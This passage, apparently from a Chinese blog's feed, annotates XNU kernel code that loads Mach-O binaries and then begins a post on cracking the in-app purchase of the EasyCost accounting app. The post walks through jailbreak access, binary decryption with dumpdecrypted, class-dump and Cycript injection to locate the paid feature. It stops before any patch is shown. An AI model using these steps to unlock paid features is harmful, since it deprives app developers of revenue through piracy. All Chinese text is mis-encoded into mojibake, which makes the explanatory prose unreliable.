Check to see if right machine type.</div><div class="line">	 */</div><div class="line">	<span class="keyword">if</span> (((<span class="keyword">cpu_type_t</span>)(header-&gt;cputype &amp; ~CPU_ARCH_MASK) != (cpu_type() &amp; ~CPU_ARCH_MASK)) ||</div><div class="line">	    !grade_binary(header-&gt;cputype, </div><div class="line">	    	header-&gt;cpusubtype &amp; ~CPU_SUBTYPE_MASK))</div><div class="line">		<span class="keyword">return</span>(LOAD_BADARCH);</div><div class="line">		</div><div class="line">	abi64 = ((header-&gt;cputype &amp; CPU_ARCH_ABI64) == CPU_ARCH_ABI64);</div><div class="line">		</div><div class="line">	<span class="keyword">switch</span> (header-&gt;filetype) &#123;</div><div class="line">	</div><div class="line">	<span class="keyword">case</span> MH_EXECUTE:</div><div class="line">		<span class="keyword">if</span> (depth != <span class="number">1</span>) &#123;</div><div class="line">			<span class="keyword">return</span> (LOAD_FAILURE);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> MH_DYLINKER:</div><div class="line">		<span class="keyword">if</span> (depth != <span class="number">2</span>) &#123;</div><div class="line">			<span class="keyword">return</span> (LOAD_FAILURE);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">		</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		<span class="keyword">return</span> (LOAD_FAILURE);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 *	Get the pager for the file.</div><div class="line">	 */</div><div class="line">	control = ubc_getobject(vp, UBC_FLAGS_NONE);</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 *	Map portion that must be accessible directly into</div><div class="line">	 *	kernel's map.</div><div class="line">	 */</div><div class="line">	<span class="keyword">if</span> ((<span class="keyword">off_t</span>)(mach_header_sz + header-&gt;sizeofcmds) &gt; macho_size)</div><div class="line">		<span class="keyword">return</span>(LOAD_BADMACHO);</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 *	Round size of Mach-O commands up to page boundry.</div><div class="line">	 */</div><div class="line">	size = round_page(mach_header_sz + header-&gt;sizeofcmds);</div><div class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">0</span>)</div><div class="line">		<span class="keyword">return</span>(LOAD_BADMACHO);</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 * Map the load commands into kernel memory.</div><div class="line">	 */</div><div class="line">	addr = <span class="number">0</span>;</div><div class="line">	kl_size = size;</div><div class="line">	kl_addr = kalloc(size);</div><div class="line">	addr = (<span class="keyword">caddr_t</span>)kl_addr;</div><div class="line">	<span class="keyword">if</span> (addr == <span class="literal">NULL</span>)</div><div class="line">		<span class="keyword">return</span>(LOAD_NOSPACE);</div><div class="line"></div><div class="line">	error = vn_rdwr(UIO_READ, vp, addr, size, file_offset,</div><div class="line">	    UIO_SYSSPACE, <span class="number">0</span>, kauth_cred_get(), &amp;resid, p);</div><div class="line">	<span class="keyword">if</span> (error) &#123;</div><div class="line">		<span class="keyword">if</span> (kl_addr)</div><div class="line">			kfree(kl_addr, kl_size);</div><div class="line">		<span class="keyword">return</span>(LOAD_IOERROR);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (resid) &#123;</div><div class="line">		<span class="comment">/* We must be able to read in as much as the mach_header indicated */</span></div><div class="line">		<span class="keyword">if</span> (kl_addr)</div><div class="line">			kfree(kl_addr, kl_size);</div><div class="line">		<span class="keyword">return</span>(LOAD_BADMACHO);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">/*</span></div><div class="line">	 *	For PIE and dyld, slide everything by the ASLR offset.</div><div class="line">	 */</div><div class="line">	<span class="keyword">if</span> ((header-&gt;flags &amp; MH_PIE) || (header-&gt;filetype == MH_DYLINKER)) &#123;</div><div class="line">		slide = aslr_offset;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	 <span class="comment">/*</span></div><div class="line">	 *  Scan through the commands, processing each one as necessary.</div><div class="line">	 *  We parse in three passes through the headers:</div><div class="line">	 *  0: determine if TEXT and DATA boundary can be page-aligned</div><div class="line">	 *  1: thread state, uuid, code signature</div><div class="line">	 *  2: segments</div><div class="line">	 *  3: dyld, encryption, check entry point</div><div class="line">	 */</div><div class="line">	</div><div class="line">	<span class="keyword">for</span> (pass = <span class="number">0</span>; pass &lt;= <span class="number">3</span>; pass++) &#123;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> (pass == <span class="number">0</span>) &#123;</div><div class="line">			<span class="comment">/* see if we need to adjust the slide to re-align... */</span></div><div class="line">			<span class="comment">/* no re-alignment needed on X86_64 or ARM32 kernel */</span></div><div class="line">			<span class="keyword">continue</span>;</div><div class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pass == <span class="number">1</span>) &#123;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">/*</span></div><div class="line">		 * Check that the entry point is contained in an executable segments</div><div class="line">		 */ </div><div class="line">		<span class="keyword">if</span> ((pass == <span class="number">3</span>) &amp;&amp; (!result-&gt;using_lcmain &amp;&amp; result-&gt;validentry == <span class="number">0</span>)) &#123;</div><div class="line">			thread_state_initialize(thread);</div><div class="line">			ret = LOAD_FAILURE;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">/*</span></div><div class="line">		 * Loop through each of the load_commands indicated by the</div><div class="line">		 * Mach-O header; if an absurd value is provided, we just</div><div class="line">		 * run off the end of the reserved section by incrementing</div><div class="line">		 * the offset too far, so we are implicitly fail-safe.</div><div class="line">		 */</div><div class="line">		offset = mach_header_sz;</div><div class="line">		ncmds = header-&gt;ncmds;</div><div class="line"></div><div class="line">		<span class="keyword">while</span> (ncmds--) &#123;</div><div class="line">			<span class="comment">/*</span></div><div class="line">			 *	Get a pointer to the command.</div><div class="line">			 */</div><div class="line">			lcp = (<span class="keyword">struct</span> load_command *)(addr + offset);</div><div class="line">			oldoffset = offset;</div><div class="line">			offset += lcp-&gt;cmdsize;</div><div class="line"></div><div class="line">			<span class="comment">/*</span></div><div class="line">			 * Perform prevalidation of the struct load_command</div><div class="line">			 * before we attempt to use its contents.  Invalid</div><div class="line">			 * values are ones which result in an overflow, or</div><div class="line">			 * which can not possibly be valid commands, or which</div><div class="line">			 * straddle or exist past the reserved section at the</div><div class="line">			 * start of the image.</div><div class="line">			 */</div><div class="line">			<span class="keyword">if</span> (oldoffset &gt; offset ||</div><div class="line">			    lcp-&gt;cmdsize &lt; <span class="keyword">sizeof</span>(<span class="keyword">struct</span> load_command) ||</div><div class="line">			    offset &gt; header-&gt;sizeofcmds + mach_header_sz) &#123;</div><div class="line">				ret = LOAD_BADMACHO;</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			&#125;</div><div class="line"></div><div class="line">			<span class="comment">/*</span></div><div class="line">			 * Act on struct load_command's for which kernel</div><div class="line">			 * intervention is required.</div><div class="line">			 */</div><div class="line">			<span class="keyword">switch</span>(lcp-&gt;cmd) &#123;</div><div class="line">				<span class="comment">//åŠ è½½segmentçš„æ•°æ®å¹¶æ˜ å°„åˆ°è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­</span></div><div class="line">			<span class="keyword">case</span> LC_SEGMENT:</div><div class="line">				<span class="keyword">if</span> (pass == <span class="number">0</span>) &#123;</div><div class="line">					<span class="keyword">break</span>;</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				<span class="keyword">if</span> (pass != <span class="number">2</span>)</div><div class="line">					<span class="keyword">break</span>;</div><div class="line"></div><div class="line">				<span class="keyword">if</span> (abi64) &#123;</div><div class="line">					<span class="comment">/*</span></div><div class="line">					 * Having an LC_SEGMENT command for the</div><div class="line">					 * wrong ABI is invalid &lt;rdar://problem/11021230&gt;</div><div class="line">					 */</div><div class="line">					ret = LOAD_BADMACHO;</div><div class="line">					<span class="keyword">break</span>;</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				ret = load_segment(lcp,</div><div class="line">				                   header-&gt;filetype,</div><div class="line">				                   control,</div><div class="line">				                   file_offset,</div><div class="line">				                   macho_size,</div><div class="line">				                   vp,</div><div class="line">				                   <span class="built_in">map</span>,</div><div class="line">				                   slide,</div><div class="line">				                   result);</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			<span class="keyword">case</span> LC_SEGMENT_64:</div><div class="line">				<span class="keyword">if</span> (pass != <span class="number">2</span>)</div><div class="line">					<span class="keyword">break</span>;</div><div class="line"></div><div class="line">				<span class="keyword">if</span> (!abi64) &#123;</div><div class="line">					<span class="comment">/*</span></div><div class="line">					 * Having an LC_SEGMENT_64 command for the</div><div class="line">					 * wrong ABI is invalid &lt;rdar://problem/11021230&gt;</div><div class="line">					 */</div><div class="line">					ret = LOAD_BADMACHO;</div><div class="line">					<span class="keyword">break</span>;</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				ret = load_segment(lcp,</div><div class="line">				                   header-&gt;filetype,</div><div class="line">				                   control,</div><div class="line">				                   file_offset,</div><div class="line">				                   macho_size,</div><div class="line">				                   vp,</div><div class="line">				                   <span class="built_in">map</span>,</div><div class="line">				                   slide,</div><div class="line">				                   result);</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">				<span class="comment">//å¼€ä¸€ä¸ªUnixçº¿ç¨‹</span></div><div class="line">			<span class="keyword">case</span> LC_UNIXTHREAD:</div><div class="line">				<span class="keyword">if</span> (pass != <span class="number">1</span>)</div><div class="line">					<span class="keyword">break</span>;</div><div class="line">				ret = load_unixthread(</div><div class="line">						 (<span class="keyword">struct</span> thread_command *) lcp,</div><div class="line">						 thread,</div><div class="line">						 slide,</div><div class="line">						 result);</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			<span class="keyword">case</span> LC_MAIN:</div><div class="line">				<span class="keyword">if</span> (pass != <span class="number">1</span>)</div><div class="line">					<span class="keyword">break</span>;</div><div class="line">				<span class="keyword">if</span> (depth != <span class="number">1</span>)</div><div class="line">					<span class="keyword">break</span>;</div><div class="line">				ret = load_main(</div><div class="line">						 (<span class="keyword">struct</span> entry_point_command *) lcp,</div><div class="line">						 thread,</div><div class="line">						 slide,</div><div class="line">						 result);</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">				<span class="comment">//å¯åŠ¨dyld</span></div><div class="line">			<span class="keyword">case</span> LC_LOAD_DYLINKER:</div><div class="line">				<span class="keyword">if</span> (pass != <span class="number">3</span>)</div><div class="line">					<span class="keyword">break</span>;</div><div class="line">				<span class="keyword">if</span> ((depth == <span class="number">1</span>) &amp;&amp; (dlp == <span class="number">0</span>)) &#123;</div><div class="line">					dlp = (<span class="keyword">struct</span> dylinker_command *)lcp;</div><div class="line">					dlarchbits = (header-&gt;cputype &amp; CPU_ARCH_MASK);</div><div class="line">				&#125; <span class="keyword">else</span> &#123;</div><div class="line">					ret = LOAD_FAILURE;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">				<span class="comment">//åŠ è½½UUID</span></div><div class="line">			<span class="keyword">case</span> LC_UUID:</div><div class="line">				<span class="keyword">if</span> (pass == <span class="number">1</span> &amp;&amp; depth == <span class="number">1</span>) &#123;</div><div class="line">					ret = load_uuid((<span class="keyword">struct</span> uuid_command *) lcp,</div><div class="line">							(<span class="keyword">char</span> *)addr + mach_header_sz + header-&gt;sizeofcmds,</div><div class="line">							result);</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			<span class="keyword">case</span> LC_CODE_SIGNATURE:</div><div class="line">				<span class="comment">/* CODE SIGNING */</span></div><div class="line">				<span class="keyword">if</span> (pass != <span class="number">1</span>)</div><div class="line">					<span class="keyword">break</span>;</div><div class="line">				<span class="comment">/* pager -&gt; uip -&gt;</span></div><div class="line">				   load signatures &amp; store in uip</div><div class="line">				   set VM object "signed_pages"</div><div class="line">				*/</div><div class="line">				ret = load_code_signature(</div><div class="line">					(<span class="keyword">struct</span> linkedit_data_command *) lcp,</div><div class="line">					vp,</div><div class="line">					file_offset,</div><div class="line">					macho_size,</div><div class="line">					header-&gt;cputype,</div><div class="line">					result);</div><div class="line">				<span class="keyword">if</span> (ret != LOAD_SUCCESS) &#123;</div><div class="line">					<span class="built_in">printf</span>(<span class="string">"proc %d: load code signature error %d "</span></div><div class="line">					       <span class="string">"for file \"%s\"\n"</span>,</div><div class="line">					       p-&gt;p_pid, ret, vp-&gt;v_name);</div><div class="line">					<span class="comment">/*</span></div><div class="line">					 * Allow injections to be ignored on devices w/o enforcement enabled</div><div class="line">					 */</div><div class="line">					<span class="keyword">if</span> (!cs_enforcement(<span class="literal">NULL</span>))</div><div class="line">					    ret = LOAD_SUCCESS; <span class="comment">/* ignore error */</span></div><div class="line"></div><div class="line">				&#125; <span class="keyword">else</span> &#123;</div><div class="line">					got_code_signatures = TRUE;</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				<span class="keyword">if</span> (got_code_signatures) &#123;</div><div class="line">					<span class="keyword">unsigned</span> tainted = CS_VALIDATE_TAINTED;</div><div class="line">					<span class="keyword">boolean_t</span> valid = FALSE;</div><div class="line">					<span class="keyword">struct</span> cs_blob *blobs;</div><div class="line">					<span class="keyword">vm_size_t</span> off = <span class="number">0</span>;</div><div class="line"></div><div class="line"></div><div class="line">					<span class="keyword">if</span> (cs_debug &gt; <span class="number">10</span>)</div><div class="line">						<span class="built_in">printf</span>(<span class="string">"validating initial pages of %s\n"</span>, vp-&gt;v_name);</div><div class="line">					blobs = ubc_get_cs_blobs(vp);</div><div class="line">					</div><div class="line">					<span class="keyword">while</span> (off &lt; size &amp;&amp; ret == LOAD_SUCCESS) &#123;</div><div class="line">					     tainted = CS_VALIDATE_TAINTED;</div><div class="line"></div><div class="line">					     valid = cs_validate_page(blobs,</div><div class="line">								      <span class="literal">NULL</span>,</div><div class="line">								      file_offset + off,</div><div class="line">								      addr + off,</div><div class="line">								      &amp;tainted);</div><div class="line">					     <span class="keyword">if</span> (!valid || (tainted &amp; CS_VALIDATE_TAINTED)) &#123;</div><div class="line">						     <span class="keyword">if</span> (cs_debug)</div><div class="line">							     <span class="built_in">printf</span>(<span class="string">"CODE SIGNING: %s[%d]: invalid initial page at offset %lld validated:%d tainted:%d csflags:0x%x\n"</span>, </div><div class="line">								    vp-&gt;v_name, p-&gt;p_pid, (<span class="keyword">long</span> <span class="keyword">long</span>)(file_offset + off), valid, tainted, result-&gt;csflags);</div><div class="line">						     <span class="keyword">if</span> (cs_enforcement(<span class="literal">NULL</span>) ||</div><div class="line">							 (result-&gt;csflags &amp; (CS_HARD|CS_KILL|CS_ENFORCEMENT))) &#123;</div><div class="line">							     ret = LOAD_FAILURE;</div><div class="line">						     &#125;</div><div class="line">						     result-&gt;csflags &amp;= ~CS_VALID;</div><div class="line">					     &#125;</div><div class="line">					     off += PAGE_SIZE;</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				<span class="keyword">break</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> CONFIG_CODE_DECRYPTION</span></div><div class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO:</div><div class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO_64:</div><div class="line">				<span class="keyword">if</span> (pass != <span class="number">3</span>)</div><div class="line">					<span class="keyword">break</span>;</div><div class="line">				ret = set_code_unprotect(</div><div class="line">					(<span class="keyword">struct</span> encryption_info_command *) lcp,</div><div class="line">					addr, <span class="built_in">map</span>, slide, vp, file_offset,</div><div class="line">					header-&gt;cputype, header-&gt;cpusubtype);</div><div class="line">				<span class="keyword">if</span> (ret != LOAD_SUCCESS) &#123;</div><div class="line">					<span class="built_in">printf</span>(<span class="string">"proc %d: set_code_unprotect() error %d "</span></div><div class="line">					       <span class="string">"for file \"%s\"\n"</span>,</div><div class="line">					       p-&gt;p_pid, ret, vp-&gt;v_name);</div><div class="line">					<span class="comment">/* </span></div><div class="line">					 * Don't let the app run if it's </div><div class="line">					 * encrypted but we failed to set up the</div><div class="line">					 * decrypter. If the keys are missing it will</div><div class="line">					 * return LOAD_DECRYPTFAIL.</div><div class="line">					 */</div><div class="line">					 <span class="keyword">if</span> (ret == LOAD_DECRYPTFAIL) &#123;</div><div class="line">						<span class="comment">/* failed to load due to missing FP keys */</span></div><div class="line">						proc_lock(p);</div><div class="line">						p-&gt;p_lflag |= P_LTERM_DECRYPTFAIL;</div><div class="line">						proc_unlock(p);</div><div class="line">					 &#125;</div><div class="line">					 psignal(p, SIGKILL);</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">break</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">			<span class="keyword">default</span>:</div><div class="line">				<span class="comment">/* Other commands are ignored by the kernel */</span></div><div class="line">				ret = LOAD_SUCCESS;</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">if</span> (ret != LOAD_SUCCESS)</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> (ret != LOAD_SUCCESS)</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (ret == LOAD_SUCCESS) &#123; </div><div class="line">		<span class="keyword">if</span> (! got_code_signatures) &#123;</div><div class="line">			<span class="keyword">if</span> (cs_enforcement(<span class="literal">NULL</span>)) &#123;</div><div class="line">				ret = LOAD_FAILURE;</div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">                               <span class="comment">/*</span></div><div class="line">                                * No embedded signatures: look for detached by taskgated,</div><div class="line">                                * this is only done on OSX, on embedded platforms we expect everything</div><div class="line">                                * to be have embedded signatures.</div><div class="line">                                */</div><div class="line">				<span class="keyword">struct</span> cs_blob *blob;</div><div class="line"></div><div class="line">				blob = ubc_cs_blob_get(vp, <span class="number">-1</span>, file_offset);</div><div class="line">				<span class="keyword">if</span> (blob != <span class="literal">NULL</span>) &#123;</div><div class="line">					<span class="keyword">unsigned</span> <span class="keyword">int</span> cs_flag_data = blob-&gt;csb_flags;</div><div class="line">					<span class="keyword">if</span>(<span class="number">0</span> != ubc_cs_generation_check(vp)) &#123;</div><div class="line">						<span class="keyword">if</span> (<span class="number">0</span> != ubc_cs_blob_revalidate(vp, blob, <span class="number">0</span>)) &#123;</div><div class="line">							<span class="comment">/* clear out the flag data if revalidation fails */</span></div><div class="line">							cs_flag_data = <span class="number">0</span>;</div><div class="line">							result-&gt;csflags &amp;= ~CS_VALID;</div><div class="line">						&#125;</div><div class="line">					&#125;</div><div class="line">					<span class="comment">/* get flags to be applied to the process */</span></div><div class="line">					result-&gt;csflags |= cs_flag_data;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div></pre></td></tr></table></figure>
<ul>
<li>æ ¹æ®load_commandçš„ä¸åŒï¼ŒåŠ è½½ä¸åŒçš„å‡½æ•°</li>
</ul>
<blockquote>
<p>ä»¥ä¸Šåªæ˜¯æ¯”è¾ƒç²—ç•¥çš„äº†è§£äº†Mach-Oçš„åŠ è½½æµç¨‹ï¼Œä¹‹åè¿˜éœ€ç†è§£çš„æ›´é€å½»ï¼Œå¦‚æœ‰ä¸è¶³çš„åœ°æ–¹è¿˜å¸Œæœ›å¯ä»¥å¤šå¤šæŒ‡æ­£^_^<br>å‚è€ƒ:</p>
<ul>
<li><a href="http://turingh.github.io/2016/03/30/OSXå†…æ ¸åŠ è½½mach-oæµç¨‹åˆ†æ/#1-5_parse_machfile" target="_blank" rel="external">http://turingh.github.io/2016/03/30/OSXå†…æ ¸åŠ è½½mach-oæµç¨‹åˆ†æ/#1-5_parse_machfile</a></li>
</ul>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> OSX </tag>
            
            <tag> Mach-O </tag>
            
            <tag> dyld </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æŸè®°è´¦Appå†…è´­ç ´è§£]]></title>
      <url>http://Hello-Sherlock.github.io/2016/12/20/five-Blog/</url>
      <content type="html"><![CDATA[<blockquote>
<p>ç®€ä»‹:æ­¤appåç§°ä¸ºEasyCostï¼Œæ˜¯ç¬”è€…ç›®å‰ä¸ºæ­¢ç”¨è¿‡çš„ç”¨æˆ·ç•Œé¢ç›¸å¯¹å‹å¥½çš„ä¸€æ¬¾è®°è´¦appï¼Œå¥ˆä½•ç”¨äº†å¾ˆä¹…ä¹‹åæ‰å‘ç°æœ‰ä¸ªæ‰€è°“çš„é«˜çº§åŠŸèƒ½ï¼Œå’¦ï¼Œçœ‹åˆ°è‡ªåŠ¨è´¦å•è¿™ä¸ªåŠŸèƒ½ï¼Œå¾ˆé«˜çº§æœ‰æœ¨æœ‰ï¼Œé‰´äºæœ€è¿‘æ‰è½¬é€†å‘ï¼Œäºæ˜¯æŠ±ç€ç ”ç©¶çš„å¿ƒæ€å°è¯•ç ´è§£ï¼Œä¹Ÿå¸Œæœ›å¯¹ä¸€äº›åŒæ—¶åˆšæ¥è§¦é€†å‘çš„æ–°æ‰‹æœ‹å‹ä¸€ç‚¹ç‚¹å¯å‘ã€‚</p>
</blockquote>
<a id="more"></a>
<p><img src="http://oh5mz2415.bkt.clouddn.com/IMG_2811.PNG" alt="IMG_2811.PNG"></p>
<h3 id="1-1åˆ†ææºä»£ç ç»“æ„ï¼Œå¹¶å®šä½å…³é”®å‡½æ•°"><a href="#1-1åˆ†ææºä»£ç ç»“æ„ï¼Œå¹¶å®šä½å…³é”®å‡½æ•°" class="headerlink" title="1.1åˆ†ææºä»£ç ç»“æ„ï¼Œå¹¶å®šä½å…³é”®å‡½æ•°"></a>1.1åˆ†ææºä»£ç ç»“æ„ï¼Œå¹¶å®šä½å…³é”®å‡½æ•°</h3><h4 id="1-1-1-é¦–å…ˆä½¿ç”¨dumpdecryptedç ¸å£³"><a href="#1-1-1-é¦–å…ˆä½¿ç”¨dumpdecryptedç ¸å£³" class="headerlink" title="1.1.1 é¦–å…ˆä½¿ç”¨dumpdecryptedç ¸å£³"></a>1.1.1 é¦–å…ˆä½¿ç”¨dumpdecryptedç ¸å£³</h4><ul>
<li>å…³äºdumpdecryptedè¯¦ç»†ä»‹ç»åœ¨<a href="http://bbs.iosre.com/t/dumpdecrypted-app/22" target="_blank" rel="external">è¿™é‡Œ</a>å°±ä¸å†èµ˜è¿°äº†</li>
<li>é¦–å…ˆsshåˆ°è¶Šç‹±çš„æ‰‹æœºï¼Œå•ç‹¬æ‰“å¼€easycostï¼Œåœ¨ç»ˆç«¯æ‰§è¡Œ<code>ps -e</code> å°±å¯ä»¥çœ‹åˆ°å½“å‰appçš„è¿›ç¨‹å </li>
</ul>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">linguochengde-iPhone:~ root<span class="meta"># ps -e</span></div><div class="line">PID TTY TIME CMD</div><div class="line"></div><div class="line"><span class="number">1</span> ?? <span class="number">0</span>:<span class="number">09.72</span> <span class="meta-keyword">/sbin/</span>launchd</div><div class="line"></div><div class="line"><span class="number">18</span> ?? <span class="number">0</span>:<span class="number">00.03</span> <span class="meta-keyword">/usr/</span>libexec/amfid</div><div class="line"></div><div class="line"><span class="number">27</span> ?? <span class="number">0</span>:<span class="number">11.42</span> <span class="meta-keyword">/usr/</span>sbin/syslogd -bsd_out <span class="number">1</span></div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line"><span class="number">1006</span> ?? <span class="number">0</span>:<span class="number">00.34</span> /System/Library/Frameworks/UIKit.framework/Support/pasteboardd</div><div class="line"></div><div class="line"><span class="number">1102</span> ?? <span class="number">0</span>:<span class="number">02.93</span> <span class="meta-keyword">/var/</span>mobile/Containers/Bundle/Application/<span class="number">7E51</span>DAF5<span class="number">-3</span>FCF<span class="number">-42</span>CF-B4CB-F47CC4078048/easycost.app/easycost</div><div class="line"></div><div class="line"><span class="number">1219</span> ?? <span class="number">0</span>:<span class="number">00.00</span> (bash)</div><div class="line"></div><div class="line"><span class="number">1220</span> ?? <span class="number">0</span>:<span class="number">00.28</span> (gssc)</div><div class="line"></div><div class="line"><span class="number">770</span> ttys000 <span class="number">0</span>:<span class="number">00.06</span> -sh</div><div class="line"></div><div class="line"><span class="number">810</span> ttys000 <span class="number">0</span>:<span class="number">00.30</span> cycript</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="number">1221</span> ttys000 <span class="number">0</span>:<span class="number">00.01</span> ps -e</div></pre></td></tr></table></figure>
<p>å› ä¸ºiOSä¸Šåªæ‰“å¼€äº†ä¸€ä¸ªAppStoreä¸­çš„appï¼Œæ‰€ä»¥å”¯ä¸€çš„é‚£ä¸ªå«æœ‰<code>/var/mobile/Containers/Bundle/Application/</code>å­—æ ·çš„ç»“æœå°±æ˜¯ç›®æ ‡å¯æ‰§è¡Œæ–‡ä»¶çš„å…¨è·¯å¾„ã€‚</p>
<p><code>Cycript -p 1102</code></p>
<h4 id="1-1-2-class-dumpè·å–-hå¤´æ–‡ä»¶"><a href="#1-1-2-class-dumpè·å–-hå¤´æ–‡ä»¶" class="headerlink" title="1.1.2 class-dumpè·å–.hå¤´æ–‡ä»¶"></a>1.1.2 class-dumpè·å–.hå¤´æ–‡ä»¶</h4><ul>
<li>åœ¨ç ¸å£³åæ–‡ä»¶çš„ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬æ‰§è¡Œ<code>class-dump --arch armv7 -S -s -H å¯æ‰§è¡Œæ–‡ä»¶ -o è‡ªå®šä¹‰çš„æ–‡ä»¶å¤¹è·¯å¾„</code>ï¼Œè·å¾—ç ¸å£³åçš„å¤´æ–‡ä»¶</li>
</ul>
<h4 id="1-1-3cycriptæ‰“å°è§†å›¾å±‚æ¬¡"><a href="#1-1-3cycriptæ‰“å°è§†å›¾å±‚æ¬¡" class="headerlink" title="1.1.3cycriptæ‰“å°è§†å›¾å±‚æ¬¡"></a>1.1.3cycriptæ‰“å°è§†å›¾å±‚æ¬¡</h4><blockquote>
<p>Cycriptæ˜¯ç”±saurikæ¨å‡ºçš„ä¸€æ¬¾è„šæœ¬è¯­è¨€ï¼Œæ›´å¤šèµ„è¯¦ç»†èµ„æ–™å¯ä»¥æŸ¥çœ‹å®ƒçš„å®˜ç½‘<a href="http://www.cycript.org" target="_blank" rel="external">http://www.cycript.org</a> ,å¯ä»¥ä»MTerminalä¸­æ‰§è¡ŒCycriptï¼Œä¹Ÿå¯ä»¥sshåˆ°iosè®¾å¤‡ä¸­æ‰§è¡ŒCycript</p>
</blockquote>
<p>æˆ‘ä»¬é¦–å…ˆæ ¹æ®ä¹‹å‰ä»‹ç»çš„æ–¹æ³•å‘ç›®æ ‡appæ³¨å…¥Cycript</p>
<p> <img src="" alt=""></p>
<p>ç´§æ¥ç€æˆ‘ä»¬æ‰¾åˆ°è¿™ä¸ªä»˜è´¹åŠŸèƒ½å…·ä½“å®ç°çš„ç•Œé¢ï¼Œä¹Ÿå°±æ˜¯åœ¨â€œå‘¨æœŸè®°è´¦â€é€‰é¡¹æ‰€åœ¨çš„ç•Œé¢ä¸­ï¼Œè¾“å…¥</p>
<p><code>UIApp.keyWindow.recursiveDescription().toString()</code>æ‰“å°å½“å‰çš„è§†å›¾å±‚æ¬¡</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/FCEB9BAB-CD0C-43D4-B426-D06C898173B3.png" alt="FCEB9BAB-CD0C-43D4-B426-D06C898173B3.png"></p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/F9450BEC-1327-422A-ABB2-329261226707.png" alt="F9450BEC-1327-422A-ABB2-329261226707.png"></p>
<p>è¿™é‡Œçœ‹åˆ°æœ‰å¥½å¤šä¸œè¥¿ï¼Œä½†æ˜¯ä»”ç»†ä¸€çœ‹ï¼Œæœ‰ä¸€ä¸ªKLSwitch,å†çœ‹åˆ°å‰é¢â€œå‘¨æœŸè®°è´¦â€çš„å¼€å…³æ˜¯ä¸€ä¸ªUISwitchï¼Œäºæ˜¯æˆ‘ä»¬å…ˆæŠŠæ³¨æ„åŠ›æ”¾åœ¨è¿™ä¸ªKLSwitchä¸Šé¢ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥å…ˆæ ¹æ®è¿™ä¸ªKLSwitchï¼Œå…ˆæ‰¾åˆ°ä»–çš„controllerï¼Œç”±äºè¿™é‡Œçš„switchæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œè¿™ä¸ªç•Œé¢æ˜¯ä¸€ä¸ªviewï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡nextResponderè¿½æº¯åˆ°å®ƒçš„controllerï¼Œç„¶åå†é€šè¿‡controlleræ¥å“åº”è¿™ä¸ªswitchï¼Œçœ‹çœ‹æˆ‘ä»¬çš„çŒœæƒ³æ˜¯å¦æ­£ç¡®ã€‚</p>
<p>æˆ‘ä»¬åœ¨class-dumpä¸­çš„å¤´æ–‡ä»¶ä¸­æœç´¢CatalogInfoViewController.h</p>
<p><img src="http://oh5mz2415.bkt.clouddn.com/9C4A794D-EA81-48A9-9CCC-B35A4732E574.png" alt="9C4A794D-EA81-48A9-9CCC-B35A4732E574.png"></p>
